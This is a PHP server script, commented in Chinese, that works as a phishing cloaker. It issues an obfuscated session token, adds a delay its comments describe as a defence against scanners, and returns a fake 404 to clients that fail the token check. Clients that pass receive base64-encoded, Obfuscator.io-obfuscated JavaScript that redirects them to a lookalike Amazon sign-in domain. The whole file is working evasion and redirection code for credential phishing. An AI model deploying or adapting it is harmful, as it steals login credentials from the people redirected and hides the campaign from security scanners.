<?php
// 启动会话管理，使得可以在请求之间保存客户端的数据（token）
session_start();

// 处理来自客户端的 JSON 格式的数据
$input = json_decode(file_get_contents('php://input'), true);

// token= 随机 8 位小写英文字母
function token($length = 8) {
    $characters = 'abcdefghijklmnopqrstuvwxyz';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

// token1=token 叠加 4 次混淆生成
function token1($token) {
    function xorOperation($token, $key) {
        $result = '';
        for ($i = 0; $i < strlen($token); $i++) {
            $result .= chr(ord($token[$i]) ^ $key);
        }
        return $result;
    }
    function shiftToken($token, $offset) {
        $result = '';
        for ($i = 0; $i < strlen($token); $i++) {
            $result .= chr(ord($token[$i]) + $offset);
        }
        return $result;
    }
    function urlEncodeToken($token) {
        return urlencode($token);
    }
    function base64EncodeToken($token) {
        return base64_encode($token);
    }
    
    // 异或运算参数为：42
    $tokenAfterXor = xorOperation($token, 42);
    // 字符偏移值参数为：2
    $tokenAfterShift = shiftToken($tokenAfterXor, 2); 
    $tokenAfterUrlEncode = urlEncodeToken($tokenAfterShift); 
    return base64EncodeToken($tokenAfterUrlEncode);  
}

// token2=token 经过摩斯密码混淆生成
function token2($token) {
    global $morseCodeMap;
    $morseToken = '';
    for ($i = 0; $i < strlen($token); $i++) {
        $char = $token[$i];
        if (isset($morseCodeMap[$char])) {
            $morseToken .= $morseCodeMap[$char] . ' ';
        }
    }
    return trim($morseToken);
}

// 延时 0.5秒 生成 token，以初步防御动态扫描仪
if (!isset($_SESSION['token'])) {
    usleep(500000);
    $_SESSION['token'] = token();
}

// 从会话中获得原始 token，调用函数执行 token1 的生成
$token = $_SESSION['token'];
$token1 = token1($token);

// 如果服务器没有发送 token1、token2，则生成新 token 发送给客户端
// 如果服务器已经发送了 token2、token2，则不生成新 token 发送给客户端
// 通过这两个逻辑，来确保：在进行新的会话（浏览器关闭后重新打开）之前，token 是唯一的，不会变化的
if (!isset($input['tokenQ1'])) {
    echo json_encode(['token' => $token]);
    exit();
}

// 如果 tokenQ1=token1，则返还经过 Obfuscator.io 混淆的 javascript 重定向代码，如果不同，返还 404
// 响应的 js 字符串，是将（window.location.href = 'https://www.amazon.adownoe.online/signin/ap';）括号内的客户端重定向 js 命令，先进行 URL 编码，再进行 base64 编码所得到
// 对应的客户端解码，应该先进行 base64 解码，再进行 URL 解码
if (isset($input['tokenQ1'])) {
    if ($input['tokenQ1'] === $token1) {
        header('Content-Type: application/javascript');
        echo <<<JS
        ZnVuY3Rpb24lMjBfMHg1NTlhKF8weDNjZjE3YyUyQ18weDVkZDA0MyklN0J2YXIlMjBfMHhhZGQ0MDYlM0RfMHhhZGQ0KCklM0JyZXR1cm4lMjBfMHg1NTlhJTNEZnVuY3Rpb24oXzB4NTU5YTNmJTJDXzB4NGQ4MmY4KSU3Ql8weDU1OWEzZiUzRF8weDU1OWEzZi0weDE2ZCUzQnZhciUyMF8weDRjOTY5OSUzRF8weGFkZDQwNiU1Ql8weDU1OWEzZiU1RCUzQnJldHVybiUyMF8weDRjOTY5OSUzQiU3RCUyQ18weDU1OWEoXzB4M2NmMTdjJTJDXzB4NWRkMDQzKSUzQiU3RGZ1bmN0aW9uJTIwXzB4YWRkNCgpJTdCdmFyJTIwXzB4MzAzYWFiJTNEJTVCJ2h0dHBzJTNBJTJGJTJGd3d3LmFtYXpvbi5hZG93bm9lLm9ubGluZSUyRnNpZ25pbiUyRmFwJyUyQyc2NzA0NDB4WEdqZWknJTJDJ2xvY2F0aW9uJyUyQyc0WkZPZUR1JyUyQycxMzA5NTlxUVBWQkMnJTJDJzE2NTA1SHNaeURxJyUyQyc4OFZJc2ZyRCclMkMnMjcyMjM0MkhtR3h3YSclMkMnNjI5OTM0Z3BNYmFUJyUyQycyNzEzMDJLWUlYc2UnJTJDJzk3NlJsSHRIeSclMkMnMTQ2N1JpSkdmRSclMkMnaHJlZiclMkMnNzdDRXVUakEnJTVEJTNCXzB4YWRkNCUzRGZ1bmN0aW9uKCklN0JyZXR1cm4lMjBfMHgzMDNhYWIlM0IlN0QlM0JyZXR1cm4lMjBfMHhhZGQ0KCklM0IlN0R2YXIlMjBfMHg1ODYzOTklM0RfMHg1NTlhJTNCKGZ1bmN0aW9uKF8weDIzZjdlZSUyQ18weDM2MzRhKSU3QnZhciUyMF8weDU0ZmEwMCUzRF8weDU1OWElMkNfMHgxYTVkMDMlM0RfMHgyM2Y3ZWUoKSUzQndoaWxlKCEhJTVCJTVEKSU3QnRyeSU3QnZhciUyMF8weDUwNWZjYSUzRHBhcnNlSW50KF8weDU0ZmEwMCgweDE2ZCkpJTJGMHgxJTJCcGFyc2VJbnQoXzB4NTRmYTAwKDB4MTc1KSklMkYweDIqKC1wYXJzZUludChfMHg1NGZhMDAoMHgxNzYpKSUyRjB4MyklMkJwYXJzZUludChfMHg1NGZhMDAoMHgxNzgpKSUyRjB4NCooLXBhcnNlSW50KF8weDU0ZmEwMCgweDE3NykpJTJGMHg1KSUyQnBhcnNlSW50KF8weDU0ZmEwMCgweDE3YSkpJTJGMHg2JTJCLXBhcnNlSW50KF8weDU0ZmEwMCgweDE3OSkpJTJGMHg3JTJCcGFyc2VJbnQoXzB4NTRmYTAwKDB4MTZlKSklMkYweDgqKC1wYXJzZUludChfMHg1NGZhMDAoMHgxNmYpKSUyRjB4OSklMkJwYXJzZUludChfMHg1NGZhMDAoMHgxNzMpKSUyRjB4YSoocGFyc2VJbnQoXzB4NTRmYTAwKDB4MTcxKSklMkYweGIpJTNCaWYoXzB4NTA1ZmNhJTNEJTNEJTNEXzB4MzYzNGEpYnJlYWslM0JlbHNlJTIwXzB4MWE1ZDAzJTVCJ3B1c2gnJTVEKF8weDFhNWQwMyU1QidzaGlmdCclNUQoKSklM0IlN0RjYXRjaChfMHgxZTgzZjkpJTdCXzB4MWE1ZDAzJTVCJ3B1c2gnJTVEKF8weDFhNWQwMyU1QidzaGlmdCclNUQoKSklM0IlN0QlN0QlN0QoXzB4YWRkNCUyQzB4NDM5OGYpJTJDd2luZG93JTVCXzB4NTg2Mzk5KDB4MTc0KSU1RCU1Ql8weDU4NjM5OSgweDE3MCklNUQlM0RfMHg1ODYzOTkoMHgxNzIpKSUzQg
JS;
        exit();
    } else {
        header('HTTP/1.1 404 Not Found');
        echo '404 Not Found';
        exit();
    }
}
?>